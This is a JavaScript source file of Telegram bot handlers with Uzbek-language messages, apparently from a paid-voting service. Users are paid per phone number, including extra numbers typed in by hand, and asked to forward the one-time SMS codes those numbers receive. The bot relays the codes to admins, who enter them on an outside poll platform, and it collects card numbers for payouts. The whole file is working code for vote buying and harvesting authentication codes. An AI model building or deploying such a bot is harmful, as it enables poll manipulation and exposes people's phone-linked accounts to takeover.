const { Markup } = require('telegraf');
const path = require('path');
const User = require('../models/User');
const Counter = require('../models/Counter');
const { formatPhone, formatPhoneDisplay, formatCardDisplay, statusText, REWARD_PER_VOTE } = require('../utils/helpers');
const { sendToAdmins, sendToAdminsSelective } = require('../utils/adminNotifier');

const NEXT_PROMPT = `\n\n📱 Qo'shimcha raqam kiritish uchun raqamni yuboring.`;

function parsePhoneInput(text) {
  const raw = text.trim();
  const digits = raw.replace(/\D/g, '');
  if (!digits) return { ok: false, reason: 'no_digits' };

  if (raw.startsWith('+998')) {
    if (digits.length !== 12) return { ok: false, reason: 'plus998_length' };
    if (!digits.startsWith('998')) return { ok: false, reason: 'invalid' };
    return {
      ok: true,
      normalized: '+' + digits,
      display: formatPhoneDisplay(digits, true),
    };
  }

  if (digits.length === 9) {
    return {
      ok: true,
      normalized: '+998' + digits,
      display: formatPhoneDisplay(digits, false),
    };
  }

  if (digits.length === 12 && digits.startsWith('998')) {
    return {
      ok: true,
      normalized: '+' + digits,
      display: formatPhoneDisplay(digits, true),
    };
  }

  if (digits.length < 9) return { ok: false, reason: 'short' };
  return { ok: false, reason: 'invalid' };
}

function parseCardInput(text) {
  const digits = text.replace(/\D/g, '');
  if (digits.length !== 16) return { ok: false };
  return { ok: true, digits };
}

/**
 * /start — ro'yxatdan o'tkazish va salomlashish
 */
async function startHandler(ctx) {
  const tgUser = ctx.from;

  let user = await User.findOne({ userId: tgUser.id });

  if (!user) {
    const seqId = await Counter.getNext('userId');
    user = await User.create({
      userId: tgUser.id,
      sequentialId: seqId,
      username: tgUser.username || null,
      firstName: tgUser.first_name || '',
      lastName: tgUser.last_name || '',
    });
  } else {
    // Ma'lumotlarni yangilash
    user.username = tgUser.username || null;
    user.firstName = tgUser.first_name || '';
    user.lastName = tgUser.last_name || '';
    await user.save();
  }

  const fullName = [user.firstName, user.lastName].filter(Boolean).join(' ');

  await ctx.replyWithPhoto(
    { source: path.resolve(process.cwd(), 'open.jpg') },
    {
      caption:
        `👋 Salom, ${fullName}!\n\n` +
        `🆔 Sizning raqamingiz: #${user.sequentialId}\n\n` +
        `Bu bot orqali so'rovnomada ovoz berishingiz mumkin.\n` +
        `Har bir tasdiqlangan telefon raqam uchun <b>${REWARD_PER_VOTE.toLocaleString()} so'm</b> olasiz.\n\n` +
        `📱 Telefon raqamingizni yuboring:`,
      parse_mode: 'HTML',
      ...Markup.keyboard([
        [Markup.button.contactRequest('📱 Telefon raqamimni yuborish')],
        ['📊 Mening hisobim'],
        ['💳 Pulni yechish'],
      ]).resize(),
    }
  );

  user.state = null;
  await user.save();
}

/**
 * Kontakt (telefon raqam) yuborilganda
 */
async function contactHandler(ctx) {
  const contact = ctx.message.contact;
  const tgUser = ctx.from;

  // Faqat o'z raqamini yuborishga ruxsat
  if (contact.user_id && contact.user_id !== tgUser.id) {
    return ctx.reply('❌ Iltimos, faqat o\'z telefon raqamingizni yuboring.');
  }

  const parsed = parsePhoneInput(contact.phone_number || '');
  if (!parsed.ok) {
    return ctx.reply(
      `❌ Raqam noto'g'ri.\n` +
      `📌 To'g'ri format: 939119572 yoki +998939119572`
    );
  }
  await processNewPhone(ctx, parsed.normalized, parsed.display);
}

/**
 * Qo'lda matn kiritilganda
 */
async function textHandler(ctx) {
  const user = await User.findOne({ userId: ctx.from.id });
  if (!user) return startHandler(ctx);

  const text = ctx.message.text;

  // SMS kod kutilmoqda
  if (user.state === 'waiting_sms') {
    const smsCode = text.trim();
    if (!/^\d{4,8}$/.test(smsCode)) {
      return ctx.reply('❌ SMS kod noto\'g\'ri. Iltimos, faqat raqamlarni kiriting (4-8 ta raqam):');
    }

    // Admin(lar)ga SMS kodni yuboring
    const phoneEntry = user.phones.find(p => p.phone === user.currentPhone && p.status === 'sms_sent');
    if (!phoneEntry) {
      return ctx.reply('❌ Aktiv raqam topilmadi. /start bosing.');
    }

    const fullName = [user.firstName, user.lastName].filter(Boolean).join(' ');

    const ownerAdminId = phoneEntry.adminId;
    await sendToAdminsSelective(
      `🔢 <b>SMS KOD KELDI</b>\n\n` +
      `👤 Mijoz: ${fullName} (@${user.username || 'yo\'q'}) #${user.sequentialId}\n` +
      `📱 Raqam: <code>${phoneEntry.phone}</code>\n` +
      `🔑 SMS Kod: <b>${smsCode}</b>\n\n` +
      `Platformaga kodni kiriting va natijani tasdiqlang:`,
      {
        parse_mode: 'HTML',
        ...Markup.inlineKeyboard([
          [
            Markup.button.callback('✅ Tasdiqlandi', `confirm_${user.userId}_${phoneEntry.phone}`),
            Markup.button.callback('❌ Rad etildi', `reject_${user.userId}_${phoneEntry.phone}`),
          ]
        ])
      },
      ownerAdminId,
      { parse_mode: 'HTML' }
    );

    user.state = 'waiting_result';
    await user.save();

    return ctx.reply(
      `✅ SMS kod adminlarga yuborildi.\n\n` +
      `⏳ Platforma <b>1-1.5 soat</b> ichida tekshiradi.\n` +
      `Natija haqida sizga xabar beramiz.` +
      NEXT_PROMPT,
      { parse_mode: 'HTML' }
    );
  }

  // Karta raqamini kutish
  if (user.state === 'waiting_card') {
    const parsedCard = parseCardInput(text.trim());
    if (!parsedCard.ok) {
      return ctx.reply('❌ Karta raqami noto\'g\'ri. 16 ta raqam kiriting: 8600123456789012');
    }

    const confirmed = user.phones.filter(p => p.status === 'confirmed').length;
    const totalPaid = Number(user.totalPaid || 0);
    const balance = Math.max(0, confirmed * REWARD_PER_VOTE - totalPaid);

    if (balance <= 0) {
      user.state = null;
      await user.save();
      return ctx.reply(
        `ℹ️ Hisobingizda mablag' yo'q.` +
        NEXT_PROMPT
      );
    }
    if (user.payoutPending) {
      user.state = null;
      await user.save();
      return ctx.reply(
        `⏳ Sizning oldingi pul yechish so'rovingiz hali yakunlanmagan.\n` +
        `Iltimos, to'lov tasdiqlanishini kuting.` +
        NEXT_PROMPT
      );
    }

    const fullName = [user.firstName, user.lastName].filter(Boolean).join(' ');
    const cardDisplay = formatCardDisplay(parsedCard.digits);

    const sent = await sendToAdmins(
      `💳 <b>PUL YECHISH SO'ROVI</b>\n\n` +
      `👤 Mijoz: ${fullName} (@${user.username || 'yo\'q'}) #${user.sequentialId}\n` +
      `🆔 Telegram ID: <code>${user.userId}</code>\n` +
      `💰 Hisob: <b>${balance.toLocaleString()} so'm</b>\n` +
      `💳 Karta: <code>${cardDisplay}</code>`,
      {
        parse_mode: 'HTML',
        ...Markup.inlineKeyboard([
          [Markup.button.callback('✅ To\'landi', `payout_paid_${user.userId}`)],
        ])
      }
    );

    user.state = null;
    user.payoutPending = true;
    user.payoutRequestedAt = new Date();
    user.payoutCardDisplay = cardDisplay;
    user.payoutAdminMessages = Array.isArray(sent) ? sent : [];
    await user.save();

    return ctx.reply(
      `✅ So'rovingiz qabul qilindi. Adminlar tez orada karta raqamingizga pul o'tkazishadi.` +
      NEXT_PROMPT,
      {
        parse_mode: 'HTML',
        ...Markup.keyboard([
          ['📊 Mening hisobim'],
          ['💳 Pulni yechish'],
        ]).resize()
      }
    );
  }

  // Mening hisobim
  if (text === '📊 Mening hisobim') {
    return accountHandler(ctx);
  }

  // Pulni yechish
  if (text === '💳 Pulni yechish') {
    user.state = 'waiting_card';
    await user.save();
    return ctx.reply(
      `💳 Karta raqamingizni yuboring (16 ta raqam):`,
      {
        parse_mode: 'HTML',
        ...Markup.keyboard([
          ['📊 Mening hisobim'],
        ]).resize()
      }
    );
  }

  // Qo'lda raqam kiritish (istalgan payt)
  const parsed = parsePhoneInput(text);
  if (parsed.ok) {
    return processNewPhone(ctx, parsed.normalized, parsed.display);
  }

  if (parsed.reason !== 'no_digits') {
    return ctx.reply(
      `❌ Raqam noto'g'ri.\n` +
      `📌 Raqamni 9 ta raqam ko'rinishida yuboring: 939119572\n` +
      `yoki +998 bilan: +998939119572`
    );
  }
}

/**
 * Yangi telefon raqamni qayta ishlash
 */
async function processNewPhone(ctx, phone, displayPhone) {
  const user = await User.findOne({ userId: ctx.from.id });

  // Bazada bu raqam mavjudmi? (o'zida yoki boshqada) — bitta so'rov
  const existingOwner = await User.findOne({ 'phones.phone': phone });

  if (existingOwner) {
    if (existingOwner.userId === ctx.from.id) {
      const entry = existingOwner.phones.find(p => p.phone === phone);
      return ctx.reply(
        `ℹ️ Bu raqam ${phone} sizda allaqachon mavjud.\n` +
        `Holat: ${statusText(entry.status)}` +
        NEXT_PROMPT,
        { parse_mode: 'HTML' }
      );
    }
    return ctx.reply(
      `❌ Bu raqam (<code>${phone}</code>) allaqachon ro'yxatdan o'tgan.` +
      NEXT_PROMPT,
      { parse_mode: 'HTML' }
    );
  }

  // Raqamni pending holatda qo'shish
  user.phones.push({ phone, displayPhone, status: 'pending' });
  user.state = null;
  user.currentPhone = phone;
  await user.save();

  // Admin(lar)ga xabar
  const fullName = [user.firstName, user.lastName].filter(Boolean).join(' ');

  const adminMessages = await sendToAdmins(
    `📲 <b>YANGI RAQAM — OVOZ UCHUN</b>\n\n` +
    `👤 Mijoz: ${fullName} (@${user.username || 'yo\'q'}) #${user.sequentialId}\n` +
    `📱 Raqam: <code>${displayPhone || phone}</code>\n` +
    `🕐 Vaqt: ${new Date().toLocaleString('uz-UZ')}`,
    {
      parse_mode: 'HTML',
      ...Markup.inlineKeyboard([
        [Markup.button.callback('🔄 Jarayonga olish', `process_${user.userId}_${phone}`)],
        [Markup.button.callback('⚠️ Avval ovoz berilgan', `already_voted_${user.userId}_${phone}`)],
      ])
    }
  );

  await User.updateOne(
    { userId: ctx.from.id, 'phones.phone': phone },
    { $set: { 'phones.$.adminMessages': Array.isArray(adminMessages) ? adminMessages : [] } }
  );

  return ctx.reply(
    `📨 Raqamingiz (<code>${phone}</code>) adminlarga yuborildi.\n\n` +
    `⏳ Admin jarayonni boshlashi bilan sizga xabar beramiz.` +
    NEXT_PROMPT,
    {
      parse_mode: 'HTML',
      ...Markup.keyboard([
        ['📊 Mening hisobim'],
      ]).resize()
    }
  );
}

/**
 * Hisob ko'rsatish
 */
async function accountHandler(ctx) {
  const user = await User.findOne({ userId: ctx.from.id });
  if (!user) return startHandler(ctx);

  const fullName = [user.firstName, user.lastName].filter(Boolean).join(' ');
  let msg = `👤 <b>${fullName}</b> #${user.sequentialId}\n\n`;

  if (user.phones.length === 0) {
    msg += '📱 Hali raqam qo\'shilmagan.\n';
  } else {
    msg += `📱 <b>Raqamlar:</b>\n`;
    user.phones.forEach((p, i) => {
      msg += `${i + 1}. <code>${p.phone}</code> — ${statusText(p.status)}\n`;
    });
  }

  const confirmed = user.phones.filter(p => p.status === 'confirmed').length;
  const totalPaid = Number(user.totalPaid || 0);
  const balance = Math.max(0, confirmed * REWARD_PER_VOTE - totalPaid);
  msg += `\n💰 <b>Jami: ${balance.toLocaleString()} so'm</b>`;
  msg += `\n   (Tasdiqlangan raqamlar: ${confirmed} ta)`;
  msg += NEXT_PROMPT;

  await ctx.reply(msg, {
    parse_mode: 'HTML',
    ...Markup.keyboard([
      ['📊 Mening hisobim'],
      ['💳 Pulni yechish'],
    ]).resize()
  });
}

module.exports = { startHandler, contactHandler, textHandler, accountHandler };
